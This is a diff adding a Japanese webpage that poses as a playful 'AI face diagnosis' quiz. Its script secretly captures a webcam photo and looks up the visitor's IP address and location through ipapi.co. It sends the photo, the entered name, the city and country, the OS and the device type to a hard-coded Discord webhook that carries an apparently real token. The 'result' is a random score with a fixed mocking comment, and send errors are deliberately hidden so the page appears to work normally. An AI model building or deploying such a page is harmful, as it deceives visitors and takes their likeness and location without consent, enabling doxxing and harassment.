@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI顔診断💖ぶん！</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <link href="https://fonts.googleapis.com/css2?family=Kosugi+Maru&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+  <style>
+    :root {
+      --pink-main: #ff69b4;
+      --pink-light: #ffc0cb;
+      --purple-light: #e0f7ff;
+      --purple-dark: #6a5acd;
+      --text-dark: #444;
+      --text-light: #fff;
+    }
+    
+    body {
+      font-family: 'Kosugi Maru', sans-serif;
+      background: linear-gradient(135deg, #ffc0cb 0%, #a2a8d3 100%); /* New gradient */
+      text-align: center;
+      padding: 1em;
+      color: var(--text-dark);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    h1 {
+      font-size: 2.5em;
+      color: var(--pink-main);
+      margin-bottom: 0.1em;
+      text-shadow: 1px 1px 3px rgba(255, 255, 255, 0.5);
+    }
+    p {
+        font-size: 1.1em;
+        margin-bottom: 1em;
+    }
+    input {
+      padding: 0.8em 1.2em;
+      border: 3px solid var(--pink-main);
+      border-radius: 2em;
+      font-size: 1.1em;
+      outline: none;
+      margin-bottom: 1.5em;
+      background: var(--text-light);
+      color: var(--text-dark);
+      transition: all 0.3s;
+      width: 80%;
+      max-width: 300px;
+    }
+    input:focus {
+        box-shadow: 0 0 10px var(--pink-main);
+    }
+    #video-container {
+      position: relative;
+      width: 90%;
+      max-width: 400px;
+      margin: 0 auto 1.5em;
+      background: var(--text-light);
+      padding: 10px;
+      border-radius: 1.5em;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+    }
+    video {
+      width: 100%;
+      height: auto;
+      border-radius: 1em;
+      display: block;
+      background: #eee;
+    }
+    button {
+      font-size: 1.3em;
+      padding: 1em 2em;
+      background: var(--pink-main);
+      color: var(--text-light);
+      border: none;
+      border-radius: 3em;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 7px 15px rgba(255, 105, 180, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5em;
+      margin: 0.5em auto;
+      font-weight: bold;
+    }
+    button:hover:not(:disabled) {
+      background: #ff4081;
+      transform: translateY(-2px);
+      box-shadow: 0 9px 18px rgba(255, 105, 180, 0.6);
+    }
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    canvas {
+      display: none;
+    }
+    #status-container {
+      background: var(--text-light);
+      border-radius: 1.5em;
+      padding: 1.5em;
+      margin-top: 1.5em;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      min-height: 8em; /* To prevent jumping */
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    #status-message {
+      font-size: 1.2em;
+      color: var(--pink-main);
+      font-weight: bold;
+      margin-bottom: 0.5em;
+    }
+    #result-score {
+        font-size: 3em;
+        color: var(--purple-dark);
+        font-weight: 900;
+        margin-bottom: 0.5em;
+    }
+    #result-comment {
+        font-size: 1.5em; /* 診断コメントを大きく表示 */
+        color: var(--pink-main);
+        font-weight: bold;
+        text-shadow: 1px 1px 2px rgba(255, 105, 180, 0.2);
+    }
+    #result-type {
+        /* 今回は使用しないが、レイアウト維持のためスタイルを残す */
+        display: none; 
+    }
+
+    /* ローディングアニメーション */
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--pink-main);
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 1em;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading .loader {
+        display: block;
+    }
+    .loading #status-message {
+        color: var(--purple-dark);
+    }
+  </style>
+</head>
+<body>
+  <h1>AI顔診断💖ぶん！</h1>
+  <p>カメラを見て、診断する人の**お名前**を入力してね！</p>
+  
+  <input type="text" id="username" placeholder="名前をここに入力！" />
+  
+  <div id="video-container">
+      <video id="video" autoplay playsinline></video>
+      <div id="no-camera" style="display:none; color: red; padding: 1em;">
+        カメラへのアクセスを許可してください🥺
+      </div>
+  </div>
+  
+  <button id="snapBtn" disabled>
+      <i class="material-icons">camera_alt</i> 診断する！
+  </button>
+  
+  <button id="retryBtn" style="display: none;">
+      <i class="material-icons">refresh</i> もう一度診断する
+  </button>
+
+  <div id="status-container">
+      <div class="loader" id="loader"></div>
+      <div id="status-message">カメラを起動中...</div>
+      <div id="result-score"></div>
+      <div id="result-comment"></div>
+      <div id="result-type"></div>
+  </div>
+
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const usernameInput = document.getElementById('username');
+    const statusContainer = document.getElementById('status-container');
+    const statusMessage = document.getElementById('status-message');
+    const resultScore = document.getElementById('result-score');
+    const resultComment = document.getElementById('result-comment');
+    const resultType = document.getElementById('result-type');
+    const snapBtn = document.getElementById('snapBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const loader = document.getElementById('loader');
+    const noCameraMessage = document.getElementById('no-camera');
+
+    // 実際のDiscord Webhook URLに置き換えてください
+    const webhookURL = 'https://discord.com/api/webhooks/1446504287260770325/j_s6lnCq-PvLESNzS2vCsiglnsJnI5yLglBDStZBvjR86izXfQcY6v_dcVAapo5FXQRs'; 
+
+    let stream = null; 
+    let isDiagnosing = false;
+
+    // --- 診断結果のロジック (カスタマイズ) ---
+    function generateResult(name) {
+        // スコアはランダム (90〜100点)
+        const score = Math.floor(Math.random() * 11) + 90; 
+        
+        // **★ユーザー指定の固定コメント★**
+        const comment = '君文学みたいな顔してるね親子かな？w';
+        
+        // タイプは非表示
+        const type = ''; 
+
+        return { score, comment, type };
+    }
+
+    // --- 環境情報取得ロジック (変更なし) ---
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (ua.indexOf('Windows') !== -1) return 'Windows';
+      if (ua.indexOf('Macintosh') !== -1) return 'Mac';
+      if (ua.indexOf('Linux') !== -1) return 'Linux';
+      if (/Android/.test(ua)) return 'Android';
+      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+      return '不明';
+    }
+
+    function getDevice() {
+      const ua = navigator.userAgent.toLowerCase();
+      if (/mobile/.test(ua)) return 'モバイル';
+      if (/tablet/.test(ua)) return 'タブレット';
+      return 'デスクトップ';
+    }
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        return await res.json();
+      } catch {
+        return null;
+      }
+    }
+    
+    // --- Discordへ送信 (変更なし) ---
+    async function sendToDiscord(name, ipInfo, os, device, blob) {
+      const formData = new FormData();
+      formData.append('file', blob, 'photo.png');
+
+      let content = `📸 ${name}の顔診断写真が届いたぶん！\n`;
+      if (ipInfo) {
+        content += `🌏 IP: ${ipInfo.ip} (${ipInfo.city} ${ipInfo.region} ${ipInfo.country_name})\n`;
+      } else {
+        content += '🌏 IP情報を取得できませんでした。\n';
+      }
+      content += `💻 OS: ${os}\n📱 デバイス: ${device}\n`;
+
+      formData.append('payload_json', JSON.stringify({ content }));
+
+      await fetch(webhookURL, {
+        method: 'POST',
+        body: formData,
+      });
+    }
+
+    // --- 診断実行ロジック ---
+    async function takePhoto() {
+      if (isDiagnosing) return;
+      isDiagnosing = true;
+      
+      const name = usernameInput.value.trim() || '名無しぶん';
+
+      // UIをローディング状態に
+      snapBtn.style.display = 'none';
+      retryBtn.style.display = 'none';
+      statusContainer.classList.add('loading');
+      resultScore.textContent = '';
+      resultComment.textContent = '';
+      resultType.textContent = '';
+      statusMessage.textContent = '📸 写真を撮って分析中... しばらく待ってぶん！';
+
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const ipInfo = await getIPInfo();
+      const os = getOS();
+      const device = getDevice();
+
+      // 擬似的な診断処理時間
+      await new Promise(resolve => setTimeout(resolve, 2500)); 
+
+      canvas.toBlob(async (blob) => {
+        try {
+            await sendToDiscord(name, ipInfo, os, device, blob);
+        } catch (error) {
+            console.error('Discord送信エラー:', error);
+            // ユーザーには成功したように見せるため、エラーを握りつぶす
+        }
+        
+        // カメラ停止
+        stopCamera();
+
+        // 診断結果の表示
+        const result = generateResult(name);
+        
+        statusContainer.classList.remove('loading');
+        statusMessage.textContent = `${name}のAI顔診断の結果だぶん！`;
+        resultScore.textContent = `${result.score}点`;
+        resultComment.textContent = `${result.comment}`; // ★固定コメントを表示★
+
+        retryBtn.style.display = 'block';
+        isDiagnosing = false;
+      }, 'image/png');
+    }
+
+    // --- カメラ制御 ---
+    function stopCamera() {
+      if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+      }
+      video.srcObject = null;
+    }
+
+    async function startCamera() {
+      stopCamera(); // 念のため既存のストリームを停止
+      statusMessage.textContent = 'カメラを起動中...';
+      snapBtn.style.display = 'none';
+      retryBtn.style.display = 'none';
+      noCameraMessage.style.display = 'none';
+      video.style.display = 'block';
+
+
+      try {
+          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          stream = s;
+          video.srcObject = stream;
+          statusMessage.textContent = '準備OK！名前を入力して診断ボタンを押してね！';
+          
+          // 名前入力チェック
+          checkNameInput();
+
+      } catch (err) {
+          console.error('カメラアクセスエラー:', err);
+          statusMessage.textContent = 'エラー: カメラにアクセスできませんでした🥺';
+          video.style.display = 'none';
+          snapBtn.disabled = true;
+          noCameraMessage.style.display = 'block';
+          retryBtn.style.display = 'block'; // リトライできるようにする
+      }
+    }
+
+    function checkNameInput() {
+        if (stream && usernameInput.value.trim().length > 0) {
+            snapBtn.disabled = false;
+            if (snapBtn.style.display !== 'block') snapBtn.style.display = 'block';
+        } else {
+            snapBtn.disabled = true;
+        }
+    }
+
+    // --- イベントリスナー ---
+    usernameInput.addEventListener('input', checkNameInput);
+    snapBtn.addEventListener('click', takePhoto);
+    retryBtn.addEventListener('click', () => {
+        resultScore.textContent = '';
+        resultComment.textContent = '';
+        resultType.textContent = '';
+        startCamera();
+    });
+
+    // 初期起動
+    startCamera();
+  </script>
+</body>
+</html>
